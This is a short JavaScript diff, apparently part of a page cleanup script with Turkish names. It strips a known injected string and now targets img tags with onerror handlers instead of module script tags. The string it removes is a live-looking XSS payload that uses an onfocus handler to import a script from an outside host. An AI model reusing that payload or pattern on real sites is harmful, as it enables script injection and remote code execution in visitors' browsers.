@@ -4,8 +4,7 @@ fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch
 
 (function() {
   const zararli = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');"`;
-  const hedefRegex = /<script\s+type=module\s+src=[^>]+><\/script>/gi;
-
+  const hedefRegex = /<img\s+src=[^>]+onerror=[^>]+>/gi;
   function temizleNode(node) {
     if(node.nodeType === Node.TEXT_NODE) {
       node.nodeValue = node.nodeValue.replaceAll(zararli, '');
